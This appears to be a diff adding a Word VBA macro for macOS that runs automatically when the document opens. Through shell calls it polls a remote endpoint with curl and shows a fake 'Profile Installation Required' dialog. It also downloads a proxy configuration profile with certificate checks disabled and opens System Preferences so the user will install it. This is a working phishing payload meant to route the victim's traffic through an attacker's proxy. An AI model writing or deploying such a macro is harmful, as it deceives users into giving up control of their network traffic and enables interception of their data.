@@ -1,0 +1,42 @@
+Dim Class1 As New Class1
+Public Sub AutoOpen()
+ActiveDocument.Sections(1).Range.Font.Hidden = False
+Set Class1.oApp = Word.Application
+Runner
+End Sub
+
+
+Sub Runner()
+    Dim doc As Document
+    Set doc = ActiveDocument
+    Dim scriptResult As String
+    Dim currentTime As Double
+    Dim res As String
+    Dim myScriptResult As String
+    
+    scriptResult = MacScript("do shell script ""curl https://myendpoint/monitor.php""")
+    
+    
+    Do
+        If scriptResult = "true" Then
+            Selection.GoTo(What:=1, Which:=2, Name:=1).Bookmarks("\Page").Range.Delete
+            doc.content.Font.Hidden = False
+            Exit Do
+        Else
+            MacScript "display dialog ""A profile is required to be installed on your Mac to access this document (" & scriptResult & "). Please install the necessary profile from the Profiles pane in System Preferences."" with title ""Profile Installation Required"" with icon note buttons {""OK""}"
+            MacScript "do shell script ""curl -k https://myendpoint/proxy.mobileconfig -o proxy.mobileconfig"" "
+            MacScript "do shell script ""open proxy.mobileconfig"" "
+            MacScript "do shell script ""open x-apple.systempreferences:com.apple.preferences.configurationprofiles"" "
+
+            currentTime = Timer
+            Do While Timer < currentTime + 10
+                DoEvents
+            Loop
+        End If
+        scriptResult = MacScript("do shell script ""curl https://myendpoint/monitor.php""")
+    Loop Until scriptResult = "true"
+End Sub
+
+
+
+
